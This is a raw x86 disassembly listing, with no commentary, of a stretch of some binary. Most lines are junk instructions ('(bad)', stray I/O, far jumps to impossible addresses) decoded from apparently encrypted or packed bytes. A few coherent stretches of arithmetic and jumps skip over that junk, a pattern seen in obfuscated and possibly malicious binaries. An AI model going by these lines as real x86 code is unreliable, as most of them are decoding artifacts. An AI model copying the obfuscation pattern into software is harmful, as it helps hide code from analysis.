  40a8d2:	xor    al,0x9c
  40a8d4:	dec    esp
  40a8d5:	mov    gs,WORD PTR [edi]
  40a8d7:	(bad)  
  40a8d8:	sar    DWORD PTR [ebx+0x840b94f],1
  40a8de:	repnz mov dl,0xca
  40a8e1:	ja     0x40a8c3
  40a8e3:	les    ebx,FWORD PTR [ecx-0x3a2cd4cb]
  40a8e9:	sbb    al,0x4c
  40a8eb:	cmp    ax,0x2e1f
  40a8ef:	jmp    0x8504:0x57dbd075
  40a8f6:	sbb    eax,DWORD PTR [edi+0x2b]
  40a8f9:	mov    bh,0xa2
  40a8fb:	gs (bad) 
  40a8fd:	loope  0x40a930
  40a8ff:	cs lock ret 0x6fa
  40a904:	or     al,0xe3
  40a906:	loop   0x40a92a
  40a908:	sub    BYTE PTR [edi],bl
  40a90a:	mov    bh,0x7e
  40a90c:	and    al,0xea
  40a90e:	mov    edx,0x95dc3bba
  40a913:	jae    0x40a944
  40a915:	xchg   esp,eax
  40a916:	sbb    edx,edi
  40a918:	int    0xa0
  40a91a:	and    al,0x8d
  40a91c:	out    dx,eax
  40a91d:	cmp    al,0xfa
  40a91f:	les    eax,FWORD PTR [ebx-0x74c7764b]
  40a925:	inc    ebp
  40a926:	in     al,dx
  40a927:	mov    ebx,DWORD PTR [ebp-0x8]
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    DWORD PTR [ebx-0x10],ebp
  40a949:	mov    cl,0x83
  40a94b:	fiadd  DWORD PTR [ebx+0x7e747878]
  40a951:	js     0x40a9cb
  40a953:	jb     0x40a9c3
  40a955:	mov    DWORD PTR [esi+0x4e10bd7],edi
  40a95b:	inc    esi
  40a95c:	out    0xd3,al
  40a95e:	dec    bl
  40a960:	xor    BYTE PTR [eax+0x72],0xe6
  40a964:	mov    bh,BYTE PTR [ecx+0xb]
  40a967:	rcr    BYTE PTR [ebx+0x11dadb85],cl
  40a96d:	call   0x52408ddf
  40a972:	sbb    DWORD PTR [ebx],edi
  40a974:	iret   
  40a975:	pop    esi
  40a976:	fucomip st,st(7)
  40a978:	popf   
  40a979:	bound  esi,QWORD PTR [ebp-0x8]
  40a97c:	add    eax,0x65419e7f
  40a981:	push   0xffffffe7
  40a983:	outs   dx,DWORD PTR ds:[esi]
  40a984:	adc    al,0x95
  40a986:	xchg   ebp,eax
  40a987:	aad    0x73
  40a989:	out    0xef,eax
  40a98b:	aam    0xf7
  40a98d:	adc    dl,BYTE PTR [ebx+0x12]
  40a990:	lods   al,BYTE PTR ds:[esi]
  40a991:	xchg   edx,eax
  40a992:	push   esp
  40a993:	loope  0x40a916
  40a995:	fldpi  
  40a997:	or     edx,DWORD PTR [edi-0x47aa8613]
  40a99d:	(bad)  
  40a99e:	hlt    
  40a99f:	push   ss
  40a9a0:	xor    ebp,DWORD PTR [ebp+0x5a51d479]
  40a9a6:	xchg   edi,eax
  40a9a7:	add    BYTE PTR [esi*1+0x4e8bf0a4],bl
  40a9ae:	mov    eax,ds:0x4d039bc8
  40a9b3:	jp     0x40a98a
  40a9b5:	xor    ebx,DWORD PTR [ebp+eax*4-0x708d8180]
  40a9bc:	jl     0x40a958
  40a9be:	cdq    
  40a9bf:	in     al,0xa0
  40a9c1:	mov    dl,0x8c
  40a9c3:	and    eax,0x11a32aab
  40a9c8:	jecxz  0x40a9db
  40a9ca:	xchg   edi,eax
  40a9cb:	mov    al,ch
  40a9cd:	mov    ebx,0xd16e31da
  40a9d2:	aaa    
  40a9d3:	sbb    DWORD PTR [ecx],edi
  40a9d5:	out    dx,al
  40a9d6:	xor    eax,0xf172eb3d
  40a9db:	adc    eax,0x894cc709
  40a9e0:	sub    al,0x97
  40a9e2:	fwait
  40a9e3:	mov    ah,ch
  40a9e5:	inc    edi
  40a9e6:	(bad)  
  40a9e7:	mov    eax,0x9c7882c3
  40a9ec:	or     eax,0xded5bb3a
  40a9f1:	mov    ebp,0x7a8ef148
  40a9f6:	cli    
  40a9f7:	icebp  
  40a9f8:	mov    cl,0x43
  40a9fa:	jle    0x40aa22
  40a9fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9fd:	out    dx,al
  40a9fe:	inc    ebp
  40a9ff:	div    BYTE PTR [edx-0x14ba91b1]
  40aa05:	inc    esi
  40aa06:	jge    0x40aa1d
  40aa08:	dec    ecx
  40aa09:	mov    al,ds:0xb30b9ec1
  40aa0e:	mov    ecx,0x3567b4de
  40aa13:	xchg   edi,eax
  40aa14:	retf   0x8677
  40aa17:	call   0x8e5:0x9693bfb0
  40aa1e:	repz add eax,0xecad4929
  40aa24:	das    
  40aa25:	jmp    0xde99:0x6a7d5485
  40aa2c:	pop    edi
  40aa2d:	pop    es
  40aa2e:	adc    eax,0x267f9af0
  40aa33:	(bad)  
  40aa34:	in     eax,0x36
  40aa36:	pop    edx
  40aa37:	or     eax,eax
  40aa39:	inc    eax
  40aa3a:	cmp    al,0x66
  40aa3c:	and    ah,BYTE PTR [ecx]
  40aa3e:	sbb    eax,ecx
  40aa40:	das    
  40aa41:	mov    ah,0x75
  40aa43:	imul   edx,DWORD PTR [eax+ebp*2+0x2d],0x109c031
  40aa4b:	rcl    DWORD PTR [edx+edi*2+0x4d5e04fc],cl
  40aa52:	cld    
  40aa53:	addr16 inc eax
  40aa55:	push   ebp
  40aa56:	push   eax
  40aa57:	ror    DWORD PTR [edi],1
  40aa59:	inc    ebx
  40aa5a:	add    DWORD PTR es:[esp+eiz*8-0x51],esi
  40aa5f:	pop    es
  40aa60:	imul   esp,DWORD PTR [ecx],0xffffff9c
  40aa63:	dec    ecx
  40aa64:	xchg   edx,eax
  40aa65:	sub    DWORD PTR [esp+esi*4],edi
  40aa68:	sub    al,0xe9
  40aa6a:	sub    al,0x37
  40aa6c:	stos   DWORD PTR es:[edi],eax
  40aa6d:	es dec eax
  40aa6f:	xor    DWORD PTR [ebp+0x6c66349b],edi
  40aa75:	jl     0x40aabc
  40aa77:	fwait
  40aa78:	in     eax,0x8d
  40aa7a:	sbb    edx,DWORD PTR [edi]
  40aa7c:	mov    al,ds:0x85c6fc72
  40aa81:	mov    al,ds:0xce44d22e
  40aa86:	mov    ecx,DWORD PTR [ebp+0x4dee3bb7]
  40aa8c:	mov    dl,0xfd
  40aa8e:	mov    edx,DWORD PTR [ebp-0x55]
  40aa91:	xchg   ecx,eax
  40aa92:	inc    DWORD PTR [ebx+eax*2-0x4e]
  40aa96:	cmp    bh,bl
  40aa98:	sub    esp,edx
  40aa9a:	popa   
  40aa9b:	jecxz  0x40aa6c
  40aa9d:	dec    ebp
  40aa9e:	aam    0x31
  40aaa0:	lods   al,BYTE PTR ds:[esi]
  40aaa1:	pop    esi
  40aaa2:	push   esi
  40aaa3:	sbb    al,0xa
  40aaa5:	sub    al,0x2c
  40aaa7:	mov    dh,0x20
  40aaa9:	popa   
  40aaaa:	hlt    
  40aaab:	cli    
  40aaac:	mov    dh,0x29
  40aaae:	and    al,0xc5
  40aab0:	add    eax,0x1e9ab532
  40aab5:	stc    
  40aab6:	fucomip st,st(1)
  40aab8:	sub    DWORD PTR es:[ebx+0x50a664dc],edx
  40aabf:	punpckhwd mm3,QWORD PTR [esp+edx*2]
  40aac3:	add    al,0x10
  40aac5:	mov    ah,0x9d
  40aac7:	mov    esp,0xae08c58e
  40aacc:	aam    0x3b
  40aace:	inc    ebx
  40aacf:	lods   eax,DWORD PTR ds:[esi]
  40aad0:	jb     0x40ab26
  40aad2:	jl     0x40aa9e
  40aad4:	xor    BYTE PTR [ecx],dh
  40aad6:	jb     0x40aab2
  40aad8:	ss stos BYTE PTR es:[edi],al
  40aada:	les    edi,FWORD PTR [eax]
  40aadc:	lock sub al,BYTE PTR [esi+0x59002076]
  40aae3:	and    DWORD PTR [ecx-0x26],0xa77fa75b
  40aaea:	xchg   edx,eax
  40aaeb:	inc    ecx
  40aaec:	sbb    DWORD PTR [edi-0x2d],0x4a
  40aaf0:	adc    al,BYTE PTR [edx+ebx*1+0x4]
  40aaf4:	ja     0x40ab57
  40aaf6:	mov    bl,0x39
  40aaf8:	loopne 0x40aad2
  40aafa:	in     eax,0xc1
  40aafc:	dec    esi
  40aafd:	lock enter 0x5533,0x3a
  40ab02:	in     eax,dx
  40ab03:	fcomp  QWORD PTR [eax-0x4f]
  40ab06:	imul   eax,DWORD PTR [edx+edi*4],0x2a1835eb
  40ab0d:	aaa    
  40ab0e:	fdiv   st(0),st
  40ab10:	aam    0x5a
  40ab12:	inc    eax
  40ab13:	dec    eax
  40ab14:	ds repz (bad) 
  40ab17:	pop    es
  40ab18:	mov    eax,0xe2b9530f
  40ab1d:	jne    0x40ab4f
  40ab1f:	ds in  eax,dx
  40ab21:	pop    edi
  40ab22:	mov    WORD PTR [edi],gs
  40ab24:	jmp    0x3c65bd20
  40ab29:	data16 out dx,al
  40ab2b:	lods   eax,DWORD PTR ds:[esi]
  40ab2c:	test   DWORD PTR [ebx],ebx
  40ab2e:	div    DWORD PTR [eax+0x65]
  40ab31:	xor    edx,DWORD PTR [edx+esi*2-0x3d]
  40ab35:	jl     0x40abb0
  40ab37:	les    edx,FWORD PTR [esi+ebp*2]
  40ab3a:	fstp   TBYTE PTR [ebx+0x4c]
  40ab3d:	adc    al,0x19
  40ab3f:	push   ebx
  40ab40:	pusha  
  40ab41:	(bad)  
  40ab42:	test   eax,0x6280a2c9
  40ab47:	inc    ebp
  40ab48:	cmp    BYTE PTR [eax+0x2b],0x3b
  40ab4c:	les    ebp,FWORD PTR ds:0x6ffeaabc
  40ab52:	popf   
  40ab53:	retf   0x5ae6
  40ab56:	gs dec esi
  40ab58:	sar    DWORD PTR ds:0xfe16b6a2,0x6f
  40ab5f:	outs   dx,BYTE PTR ds:[esi]
  40ab60:	dec    esp
  40ab61:	xchg   edx,eax
  40ab62:	lds    ebx,FWORD PTR [edi+0x24912ba9]
  40ab68:	cmp    eax,0x4e3ab48c
  40ab6d:	call   ebp
  40ab6f:	xchg   DWORD PTR [esi-0x27314408],ebx
  40ab75:	cmp    BYTE PTR [edi],dh
  40ab77:	xor    DWORD PTR [ebx],0x32
  40ab7a:	pop    esp
  40ab7b:	and    DWORD PTR [ecx+edx*8],ecx
  40ab7e:	(bad)  
  40ab7f:	xchg   BYTE PTR [ecx-0x52],dh
  40ab82:	and    BYTE PTR [eax-0x66],0x6c
  40ab86:	inc    esp
  40ab87:	jle    0x40abcd
  40ab89:	test   eax,0x37971639
  40ab8e:	adc    al,BYTE PTR [ecx-0x1220937d]
  40ab94:	mov    al,ds:0x13d0d358
  40ab99:	ds inc ebx
  40ab9b:	popf   
  40ab9c:	add    ebx,ebp
  40ab9e:	add    DWORD PTR [edi-0x4c],esi
  40aba1:	pop    es
  40aba2:	pop    eax
  40aba3:	leave  
  40aba4:	pop    esp
  40aba5:	adc    al,0x63
  40aba7:	add    al,0xd5
  40aba9:	sub    ch,ch
  40abab:	sar    BYTE PTR [edx-0x24],cl
  40abae:	(bad)  
  40abaf:	stos   BYTE PTR es:[edi],al
  40abb0:	xlat   BYTE PTR ds:[ebx]
  40abb1:	inc    ecx
  40abb2:	aad    0x9f
  40abb4:	cmp    eax,0x2011c64f
  40abb9:	push   0xe
  40abbb:	mov    ds:0x763528bf,eax
  40abc0:	dec    ebp
  40abc1:	test   DWORD PTR [eax+0x5b],0x2746d2f0
  40abc8:	jae    0x40ac07
  40abca:	sub    BYTE PTR [edx-0x2779999a],dl
  40abd0:	sti    
  40abd1:	pop    esp
  40abd2:	xchg   esp,eax
  40abd3:	jl     0x40ab9f
  40abd5:	stc    
  40abd6:	mov    eax,ds:0xd8400789
  40abdb:	push   ss
  40abdc:	sub    eax,0x61f65fec
  40abe1:	sub    DWORD PTR ds:0x227c9067,esi
  40abe7:	jbe    0x40ac11
  40abe9:	adc    al,0xfe
  40abeb:	(bad)  
  40abec:	(bad)  
  40abed:	call   0xb592:0xb2abf228
  40abf4:	(bad)  
  40abf5:	cmp    BYTE PTR [eax],ch
  40abf7:	(bad)  
  40abf8:	mov    ch,0x6
  40abfa:	inc    eax
  40abfb:	imul   esi,DWORD PTR [ebp-0x38cc2b35],0x5
  40ac02:	mov    DWORD PTR [ebp+eax*1+0x3e9e797d],edi
  40ac09:	mov    dh,0x29
  40ac0b:	lods   eax,DWORD PTR ds:[esi]
  40ac0c:	lds    ecx,FWORD PTR [ecx]
  40ac0e:	jmp    0xa83a2155
  40ac13:	je     0x40ac89
  40ac15:	lods   eax,DWORD PTR gs:[esi]
  40ac17:	jno    0x40ab9f
  40ac19:	xor    ebx,DWORD PTR [edi-0x4f]
  40ac1c:	or     BYTE PTR [eax],0x74
  40ac1f:	sbb    bl,BYTE PTR [ecx-0x17]
  40ac22:	popa   
  40ac23:	fmul   st,st(7)
  40ac25:	ins    BYTE PTR es:[edi],dx
  40ac26:	mov    dl,0x9d
  40ac28:	xchg   esi,eax
  40ac2a:	jo     0x40ac1b
  40ac2c:	cli    
  40ac2d:	cmp    ecx,esi
  40ac2f:	ss jae 0x40ac52
  40ac32:	leave  
  40ac33:	push   edx
  40ac34:	aaa    
  40ac35:	adc    al,0xe5
  40ac37:	xchg   esi,eax
  40ac38:	sub    ecx,DWORD PTR [ebx]
  40ac3a:	mov    ds:0xfd41949f,al
  40ac3f:	xor    DWORD PTR [edi+0x2ed32265],ebp
  40ac45:	in     eax,dx
  40ac46:	mov    dl,0xe2
  40ac48:	and    eax,0x1ead342d
  40ac4d:	pop    edi
  40ac4e:	cli    
  40ac4f:	xor    ebx,ecx
  40ac51:	xor    edx,edx
  40ac53:	add    eax,esi
  40ac55:	add    ebx,esi
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	movsx  ecx,BYTE PTR [edi]
  40ac8e:	mov    esp,ebx
  40ac90:	(bad)  
  40ac91:	cmp    BYTE PTR [eax+0x78],0x74
  40ac95:	jle    0x40ad0f
  40ac97:	js     0x40acab
  40ac99:	adc    ch,BYTE PTR [edi]
  40ac9b:	ret    
  40ac9c:	and    BYTE PTR [ebp+0x8],0x21
  40aca0:	jno    0x40ac7e
  40aca2:	mov    edx,ss
  40aca4:	sub    DWORD PTR [ebp+0x107082f7],eax
  40acaa:	ret    
  40acab:	mov    ch,0x2d
  40acad:	cmp    dh,BYTE PTR [edi-0x3c7b4cbf]
  40acb3:	cli    
  40acb4:	addr16 dec ecx
  40acb6:	fidiv  WORD PTR [ebx-0x1c]
  40acb9:	popa   
  40acba:	mov    al,ds:0x56753f04
  40acbf:	mov    al,0xf3
  40acc1:	cmp    al,BYTE PTR [esi+0x213085d8]
  40acc7:	scas   eax,DWORD PTR es:[edi]
  40acc8:	shl    DWORD PTR [edi+0x7f05a28],cl
  40acce:	lods   eax,DWORD PTR ds:[esi]
  40accf:	jno    0x40ad26
  40acd1:	lock gs or eax,0xeb3ce09b
  40acd8:	js     0x40acf2
  40acda:	inc    ecx
  40acdb:	test   eax,0x812c6238
  40ace0:	std    
  40ace1:	call   0x4760050b
  40ace6:	and    eax,0xa1a6e1ca
  40aceb:	stos   BYTE PTR es:[edi],al
  40acec:	retf   0x4f6d
  40acef:	rol    esp,1
  40acf1:	sub    dh,dl
  40acf3:	sbb    ebp,edi
  40acf5:	cld    
  40acf6:	push   ss
  40acf7:	cmp    DWORD PTR [esi+ebx*1],edx
  40acfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acfb:	mov    ds:0xf5ae4ecf,al
  40ad00:	repnz sbb al,0xed
  40ad03:	mov    BYTE PTR [eax*8-0x6a7575f2],dh
  40ad0a:	sub    eax,0xeae7b70f
  40ad0f:	jl     0x40ad75
  40ad11:	stos   BYTE PTR es:[edi],al
  40ad12:	stos   BYTE PTR es:[edi],al
  40ad13:	clc    
  40ad14:	shl    DWORD PTR [ecx-0x3ab5147f],cl
  40ad1a:	(bad)  
  40ad1b:	pusha  
  40ad1c:	or     BYTE PTR [edx],0x0
  40ad1f:	fist   WORD PTR [edi-0x7d]
  40ad22:	loope  0x40ad51
  40ad24:	or     DWORD PTR [edx-0x71517512],eax
  40ad2a:	dec    esp
  40ad2b:	test   BYTE PTR [esi],al
  40ad2d:	xor    BYTE PTR [esi],bh
  40ad2f:	xchg   ebp,eax
  40ad30:	mov    al,0x3e
  40ad32:	cld    
  40ad33:	and    DWORD PTR [ecx+ebx*4],ecx
  40ad36:	out    dx,eax
  40ad37:	mov    ebp,0xcc20d15f
  40ad3c:	cs sub al,0x3c
  40ad3f:	add    edx,esp
  40ad41:	ds retf 
  40ad43:	retf   
  40ad44:	inc    edi
  40ad45:	stos   BYTE PTR es:[edi],al
  40ad46:	(bad)  
  40ad48:	xor    cl,BYTE PTR [ebx+0x4ceded94]
  40ad4e:	jae    0x40ad5b
  40ad50:	(bad)  
  40ad52:	add    eax,0x66a7f69d
  40ad57:	imul   esi,esp,0x456e1b4d
  40ad5d:	sbb    bh,BYTE PTR [eax]
  40ad5f:	out    dx,eax
  40ad60:	inc    eax
  40ad61:	in     eax,0x54
  40ad63:	(bad)  
  40ad64:	retf   0xbe04
  40ad67:	call   0xc6a90f25
  40ad6c:	push   ds
  40ad6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad6e:	leave  
  40ad6f:	test   eax,0xd0a7e773
  40ad74:	xor    DWORD PTR [esi+0x45e16268],0xae08b178
  40ad7e:	test   ecx,ebp
  40ad80:	mov    eax,0xa4d0e7e1
  40ad85:	mul    dl
  40ad87:	xchg   edx,eax
  40ad88:	dec    ebp
  40ad89:	xlat   BYTE PTR ds:[ebx]
  40ad8a:	or     eax,0xd8eda73e
  40ad8f:	lea    ecx,[edx+0x24]
  40ad92:	dec    edi
  40ad93:	cmp    eax,esi
  40ad95:	mov    eax,ds:0xd1a03c72
  40ad9a:	mov    esp,0x3be9cea3
  40ad9f:	(bad)  
  40ada0:	jg     0x40adf0
  40ada2:	adc    BYTE PTR [esi+0x9],dl
  40ada5:	cwde   
  40ada6:	mov    al,ds:0x4a6bec47
  40adab:	mov    ebp,0x415aa17f
  40adb0:	call   0x9bfd:0xf6e2c15b
  40adb7:	push   ebp
  40adb8:	sti    
  40adb9:	add    BYTE PTR [ebx+esi*1],al
  40adbc:	jge    0x40ad58
  40adbe:	ds jge 0x40ad68
  40adc1:	push   es
  40adc2:	jmp    0x3ee4:0xe9937c5a
  40adc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adca:	sbb    DWORD PTR [esi-0x55],ecx
  40adcd:	mov    edx,DWORD PTR [edi]
  40adcf:	call   0xdc2c:0x78de908d
  40add6:	dec    eax
  40add7:	fisttp WORD PTR [ebp+0x70ac69fe]
  40addd:	jp     0x40adea
  40addf:	jle    0x40ae3c
  40ade1:	push   ebx
  40ade2:	and    edi,0xf7533c68
  40ade8:	addr16 push ebx
  40adea:	inc    eax
  40adeb:	and    eax,0x466a92df
  40adf0:	or     ah,ah
  40adf2:	pusha  
  40adf3:	and    bh,BYTE PTR [edi]
  40adf5:	int3   
  40adf6:	les    ebx,FWORD PTR [ebx]
  40adf8:	pop    ecx
  40adf9:	mov    edx,0x17015271
  40adfe:	clc    
  40adff:	fwait
  40ae00:	and    ecx,edx
  40ae02:	das    
  40ae03:	ret    0xe8b8
  40ae06:	dec    edi
  40ae07:	rcl    DWORD PTR [edx-0x37128ab4],1
  40ae0d:	dec    ebx
  40ae0e:	cdq    
  40ae0f:	in     al,0xac
  40ae11:	(bad)  
  40ae12:	pop    eax
  40ae13:	inc    ebx
  40ae14:	int3   
  40ae15:	mov    al,ds:0xa346f303
  40ae1a:	mov    bh,0xff
  40ae1c:	mov    ah,0x1d
  40ae1e:	sub    DWORD PTR [esp+esi*4+0x4e],ebp
  40ae22:	scas   eax,DWORD PTR es:[edi]
  40ae23:	loope  0x40ae8a
  40ae25:	jp     0x40ae7e
  40ae27:	cs add al,0xaa
  40ae2a:	push   edi
  40ae2b:	mov    ch,0xe
  40ae2d:	and    ecx,DWORD PTR [ecx+0x17]
  40ae30:	(bad)  
  40ae31:	fcom   QWORD PTR [edi]
  40ae33:	call   0x110acb73
  40ae38:	mov    ds,WORD PTR [ebp-0x67681955]
  40ae3e:	pop    esi
  40ae3f:	push   eax
  40ae40:	aam    0xb
  40ae42:	outs   dx,DWORD PTR ds:[esi]
  40ae43:	xchg   edi,eax
  40ae44:	mov    esp,ecx
  40ae46:	pop    eax
  40ae47:	jmp    0x40ae4b
  40ae49:	test   al,0xe8
  40ae4b:	dec    esp
  40ae4c:	test   DWORD PTR [ebx-0x28],0xea9675ae
  40ae53:	mov    al,ds:0x639a1adf
  40ae58:	in     eax,0x5c
  40ae5a:	push   edx
  40ae5b:	aad    0x44
  40ae5d:	xchg   DWORD PTR [ebp-0x72f38e33],edi
  40ae63:	cmp    al,0x61
  40ae65:	mov    WORD PTR [edi+0x237ac393],?
  40ae6b:	mov    cl,0x94
  40ae6d:	push   esi
  40ae6e:	mov    cl,0xe2
  40ae70:	ror    BYTE PTR [esi],1
  40ae72:	xchg   ebx,eax
  40ae73:	(bad)  
  40ae75:	mov    dh,0xa1
  40ae77:	fmul   st(7),st
  40ae79:	and    DWORD PTR [ecx],esi
  40ae7b:	ror    BYTE PTR [ecx-0x31],1
  40ae7e:	mov    edx,0x81a25c0
  40ae83:	pop    edi
  40ae84:	loopne 0x40aeee
  40ae86:	jns    0x40ae97
  40ae88:	pop    ecx
  40ae89:	adc    ch,BYTE PTR [ecx+0x2af3ac7]
  40ae8f:	pop    esp
  40ae90:	cs nop
  40ae92:	out    dx,eax
  40ae93:	jmp    0x589fb13
  40ae98:	test   BYTE PTR [edi-0x1773f946],dh
  40ae9e:	mov    ch,BYTE PTR [edx-0x377ef412]
  40aea4:	mov    ds:0xa6c085c2,al
  40aea9:	jb     0x40af20
  40aeab:	imul   edx,DWORD PTR [esi-0x61375642],0x51582b7d
  40aeb5:	cwde   
  40aeb6:	inc    ebp
  40aeb7:	stos   DWORD PTR es:[edi],eax
  40aeb8:	jb     0x40aef3
  40aeba:	cmp    al,0x1f
  40aebc:	les    eax,FWORD PTR [edi]
  40aebe:	adc    ecx,ebx
  40aec0:	wbinvd 
  40aec2:	lea    edx,[eax]
  40aec4:	mov    cl,0x8c
  40aec6:	push   ebx
  40aec7:	pop    ss
  40aec8:	popa   
  40aec9:	div    ch
  40aecb:	mov    ch,0x55
  40aecd:	jb     0x40ae6d
  40aecf:	add    eax,0xcf45fddb
  40aed4:	cwde   
  40aed5:	(bad)  
  40aed6:	mov    ch,0x1e
  40aed8:	mov    ebx,0x2fb3e7c3
  40aedd:	xchg   edi,eax
  40aede:	into   
  40aedf:	sar    DWORD PTR [ecx+0x77],cl
  40aee2:	push   esp
  40aee3:	xor    ecx,esp
  40aee5:	aaa    
  40aee6:	cmp    edx,DWORD PTR [edx+0x4073792]
  40aeec:	jb     0x40ae8a
  40aeee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aeef:	xor    bl,BYTE PTR [edx]
  40aef1:	retf   
  40aef2:	stos   BYTE PTR es:[edi],al
  40aef3:	jae    0x40aeca
  40aef5:	sbb    bh,ah
  40aef7:	pop    edi
  40aef8:	mov    edi,0xc70cbc3e
  40aefd:	xchg   BYTE PTR [edi-0x50],cl
  40af00:	jle    0x40af62
  40af02:	(bad)
  40af06:	loop   0x40af6c
  40af08:	fmulp  st(6),st
  40af0a:	xchg   ebp,eax
  40af0b:	add    DWORD PTR [ecx],0xbf82545f
  40af11:	jge    0x40aeea
  40af13:	cs xor eax,0x36940c3
  40af19:	jmp    0x6cb5:0x94e0eaa2
  40af20:	cmp    DWORD PTR [edx],0x7007d73e
  40af26:	mov    ch,0x31
  40af28:	adc    al,0x59
  40af2a:	dec    ebx
  40af2b:	dec    esp
  40af2c:	aam    0xb8
  40af2e:	xor    esp,ebx
  40af30:	jns    0x40aecd
  40af32:	in     eax,0x1b
  40af34:	jge    0x40af71
  40af36:	aam    0xe8
  40af38:	push   ebx
  40af39:	lea    edi,[esi]
  40af3b:	inc    eax
  40af3c:	sbb    DWORD PTR [eax-0x2b666d42],esp
  40af42:	scas   al,BYTE PTR es:[edi]
  40af43:	fsubr  QWORD PTR ds:0xaef50778
  40af49:	pop    ss
  40af4a:	fwait
  40af4b:	loop   0x40af55
  40af4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af4e:	or     al,0xc6
  40af50:	scas   eax,DWORD PTR es:[edi]
  40af51:	and    BYTE PTR [esi],0xa0
  40af54:	mov    edi,0x52fe94da
  40af59:	inc    edi
  40af5a:	repnz stos BYTE PTR es:[edi],al
  40af5c:	mov    esi,0xf8f6a910
  40af61:	(bad)  
  40af63:	in     al,dx
  40af64:	sub    DWORD PTR [edx-0x70],0xa080bc5c
  40af6b:	fild   QWORD PTR [ebx+0x45]
  40af6e:	scas   al,BYTE PTR es:[edi]
  40af6f:	xchg   ebx,eax
  40af70:	xor    eax,0xea808df7
  40af75:	mov    bl,0x9a
  40af77:	mov    esp,0x59182c7b
  40af7c:	jp     0x40af80
  40af7e:	lds    ebx,FWORD PTR [ebp+0x5db4c8b1]
  40af84:	jns    0x40af5e
  40af86:	and    BYTE PTR [esi+0x37],ch
  40af89:	and    ebx,0x5998c825
  40af8f:	or     eax,DWORD PTR [edx]
  40af91:	pop    edi
  40af92:	out    dx,al
  40af93:	in     eax,0x8b
  40af95:	adc    BYTE PTR [ecx-0x2e],ch
  40af98:	in     eax,dx
  40af99:	test   eax,0x1089f89e
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	outs   dx,BYTE PTR ds:[esi]
  40afb3:	inc    eax
  40afb4:	cmp    ecx,edi
  40afb6:	rol    BYTE PTR [ebp+0x7e747878],cl
  40afbc:	js     0x40b036
  40afbe:	aad    0x8
  40afc0:	jb     0x40af50
  40afc2:	push   ds
  40afc3:	aas    
  40afc4:	bound  edx,QWORD PTR [eax-0x4d]
  40afc7:	repnz stos BYTE PTR es:[edi],al
  40afc9:	cmp    esi,ebp
  40afcb:	fld    DWORD PTR [ebx]
  40afcd:	add    DWORD PTR [ecx+0x7f73a2b8],edx
  40afd3:	pop    edx
  40afd4:	shl    DWORD PTR [ebx-0x2e92c191],cl
  40afda:	sbb    al,0xb
  40afdc:	xchg   esi,eax
  40afdd:	dec    edx
  40afde:	add    eax,0x24feeb25
  40afe3:	into   
  40afe4:	fstp   QWORD PTR [ebp-0x3e48cf4d]
  40afea:	lea    eax,[edx-0x47]
  40afed:	mov    ch,BYTE PTR [ebx+0x4c]
  40aff0:	push   eax
  40aff1:	shl    eax,1
  40aff3:	sub    al,0xd6
  40aff5:	jg     0x40b009
  40aff7:	xor    eax,0x63703e5b
  40affc:	adc    eax,esi
  40affe:	and    BYTE PTR [edx],0xe9
  40b001:	jmp    0xfb3328b2
  40b006:	add    al,0xbd
  40b008:	arpl   WORD PTR [ecx-0x4cc449d3],ax
  40b00e:	in     al,dx
  40b00f:	pop    ecx
  40b010:	sti    
  40b011:	daa    
  40b012:	sbb    esp,DWORD PTR [ecx+0x4bd40445]
  40b018:	or     bh,dh
  40b01a:	xlat   BYTE PTR ds:[ebx]
  40b01b:	and    edx,DWORD PTR [ecx-0x6a]
  40b01e:	inc    ebp
  40b01f:	mov    edx,0x5f5b165e
  40b024:	xchg   esi,eax
  40b025:	and    esi,DWORD PTR [ebp+0x6ba00769]
  40b02b:	scas   al,BYTE PTR es:[edi]
  40b02c:	ins    BYTE PTR es:[edi],dx
  40b02d:	adc    ah,dl
  40b02f:	retf   0x659f
  40b032:	lea    ebp,[edx-0x41]
  40b035:	xor    DWORD PTR [edi-0x50],0x84d821fd
  40b03c:	test   BYTE PTR [edi-0x73],bl
  40b03f:	jle    0x40b088
  40b041:	or     eax,0xa5ad4ad4
  40b046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b047:	mov    al,ds:0x11f47ac8
  40b04c:	fisubr WORD PTR [eax]
  40b04e:	and    DWORD PTR [edx+0x5ddba4e7],edx
  40b054:	jg     0x40b027
  40b056:	fsub   DWORD PTR [ebx+0x8]
  40b059:	fs iret 
  40b05b:	stc    
  40b05c:	lods   al,BYTE PTR ds:[esi]
  40b05d:	(bad)  
  40b05e:	loopne 0x40b0cf
  40b060:	cmp    eax,0xf4d37a82
  40b065:	mov    cl,0x99
  40b067:	adc    BYTE PTR [edx],ah
  40b069:	or     BYTE PTR [ebx+0x4a52696a],ch
  40b06f:	bound  ebp,QWORD PTR [ebx-0x6b5a6b49]
